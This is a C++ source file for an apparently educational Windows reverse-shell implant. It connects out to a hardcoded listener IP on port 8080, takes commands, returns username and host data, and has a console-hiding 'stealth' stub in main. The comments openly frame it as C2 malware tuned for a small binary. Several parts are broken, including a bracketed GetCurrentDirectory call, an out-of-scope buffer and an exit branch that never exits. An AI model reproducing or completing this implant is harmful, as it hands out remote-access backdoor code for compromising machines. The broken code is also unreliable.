// C++ Headers

#include <winsock2.h>   // Socker Headers
#include <windows.h>    // Win API Header
#include <ws2tcpip.h>   // TCP-IP Header

// C Headers
#include <stdio.h>      // Input output header

// Debug c++ headers
#include <iostream>     // input output debug header

#pragma comment(lib, "Ws2_32.lib"); //send signal to the compiler to link the Windows32 library "ws_32.lib" with our program

#define DEFAULT_BUFLEN 1024


/* 
  The data from the if-else function gets sent to this function, wehre the whoami will run a WINAPI function to get the desired value. 
  This function takes 2 arguments, namely the buffer and size. 
  We specify the buffer using its address location in memory 
  we then run GetuserName WINAPI to get current username and store it in the address of the returnval variable
  which in our case, is the same as thet of the buffer char
  the funciton is a void, and doesnt return anything because it is directly storing the value in the address and not a new returnval variable. 
  GetUserName WINAPI does not support uisng an INT, and thus we ahve to use the DWORD length which is windows down datatype and then convert it to int 
*/ 
/* 
This function will execute the whoami in WINAPI to get the desired values 
This function goes above the void RevShell() funciton. 
This takes 2 arguments, returnval, which is the same as that of the buffer char. This is a void function and does not return anything. This directly stores
the value in the address and not a new returnval variable. and returnsize. 
GetUserName WINAPI doesnt support using an INT, so we have to use DWORD length which is a windows own datatype and then covert to INT. 
*/
void whoami(char* returnval, int returnsize){
    DWORD bufferlen = 257;
    GetUserName(returnval, &bufferlen);
}

/* 
  Exxecufte a hostname function to get hostname
*/
void hostname(char* returnval, int returnsize){
  DWORD bufferlen=257; 
  GetComputerName(returnval, &bufferlen);
}

/* 
  Get current working directory - 
  Here, MAX_PATH is another globally defined legth of 260 bytes in windows. 
  need to change the if else block 
*/ 
void pwd(char* returnval, int returnsize){
  TCHAR tempvar[MAX_PATH]; // MAX_PATH is another globally defined length of 260 bytes in windows
  GetCurrentDirectory[MAX_PATH, tempvar];
  strcat(returnval, tempvar);
}

void RevShell(){
  WSADATA wsaver; // The WSADATA structure contains details for the system wheter it can connect to a network, this allows us to create a socket
  WSAStartup(MAKEWORD(2,2), &wsaver);
  SOCKET tcp_socket = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP); // we create a tcp socket that we use for the reverse shell
  sockaddr_in addr; // another data strcuture of windows which needs the values of what addressing scheme is to be used, the IP address to connect to and ports. Such as a C2 Server
  
  /* the below section attempts to connect to a listening port for netcat over port 8080
  it checks if the connection is stable I think (no errors) and prints out a connection successfull
   Otherwise, it closes the connection */
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = inet_addr("192.168.219.134");
  addr.sin_port = htons(8080);
  if(connect(tcp_socket, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR){
    closesocket(tcp_socket);
    exit(0);
  }else{
    std::cout << "[+] Connected. Hit <Enter> to disconnect..." << std::endl;
    std::cin.get();

    /* Here we try to parse the response recieved from the netcat server and prompt a reply as to wheter the command was parsed or not
      and finally, we will try to understand the compiler flags and options that we are using to compile the binary

      Siunce we have our TCP socket already, the next thing we need to do is create a buffer which will store the command that we will recieve from the netcat/python server.

      Most People would use <strings.h> because this is more secure and automatically adds a new line to dtop the buffer when using strcpy.
      This helps us to create a buffer overflow free binary. But, another thing to question is how much space would the <strings> header occupy.
      Using the strings header automatically shoots the size of the binary up to 800+KB which is a problem from a malware perspective.

      This is the reason why we will stick to char from C.

      char has its own set of disadvantages. It needs to be initiated with a specific length, which gets stored on the stack.
      If we want a dynamic size, a char shose length which we don't know of, then we would have to store the char on heap rather than a stack.
      Also, we need to use the strcpy and memcpy very carefully so that we don't cause a buffer overflow

      Main Reason being strcpy is vulnerable tot he power infinity
      Once we define the value of char which will be empty as of now, we need to set the socket in the blocking mode which will keep listening for an incomming command or buffer.

      Once a command is recieved, we will print the command along with the size of the buffer on the screen. */

      char CommandRecieved[DEFAULT_BUFLEN] = ""; // EMPTY BUFFER
      while (true){
        int Result = recv(tcp_socket, CommandRecieved, DEFAULT_BUFLEN, 0); // this works until we recieve an exit command

        std::cout << "Command Recieved: " << CommandRecieved;
        std::cout << "Length of the command Recieved: "<< Result << std::endl;

        /* we can test the concept of this by creating if statements of commands recieved with a string which will roeute to a function. Everytime we recieve a command, we will check
          if it matches a string,. If it does, we print the command recieved on the screen and execute a funciton. */
          if ((strcmp(CommandRecieved, "whoami\n") == 0)) {
            std::cout << "Command parsed: whoami\n" << std::endl;
            /* 
            The whole code recieved 257 bytes (256 bytes for windows username data + new line) 
            we then add a newline using strcat() to the buffer and send the value to the C2 server in the same TCP Socket. 
            Then reset both buffers CommandRecieved and buffer, this is to not add up garbage to the next incoming commands 
            */ 
              char buffer[257] = "";
              //Execute a whoami() function
              whoami(buffer,257);
              strcat(buffer, "\n");
              send(tcp_socket, buffer, strlen(buffer)+1, 0);
              memset(buffer, 0, sizeof(buffer));
              memset(CommandRecieved, 0, sizeof(CommandRecieved));
            
          }
          else if ((strcmp(CommandRecieved, "pwd\n") == 0)) {
              std::cout << "Command parsed: pwd\n" << std::endl;
              //Execute a pwd() function
              pwd(buffer,257);
          }
          else if ((strcmp(CommandRecieved, "exit\n") == 0)) {
              std::cout << "Command parsed: exit\n";
              std::cout << "Closing connection\n" << std::endl;
              //Exit gracefully
          }
          else {
              std::cout << "Command not parsed!" << std::endl;
          }

          memset(CommandRecieved, 0, sizeof(CommandRecieved)); // resets the value of CommandRecieved with the actual size and empty buffer
          // the reason for this is in the event that we recieve a command with a big buffer size followed by a small buffer size, then the remaining buiffer space in the smaller buffer will be filled with garbabe

      }
  }
  closesocket(tcp_socket);
  WSACleanup();
  exit(0);
}




// main function
int main(){
  HWND stealth;       // Declare a window handle
  AllocConsole();     // Allocate a new console
  stealth = FindWindowA("ConsoleWindowClass",NULL); // Find the previous windows handler and hide/show the windows depending on the next command
  ShowWindow(stealth,SW_SHOWNORMAL); // SW_SHOWNORMAL = 1 = SHOW, SW_HIDEE = 0 = Hide the console
  RevShell();
  return 0;
}
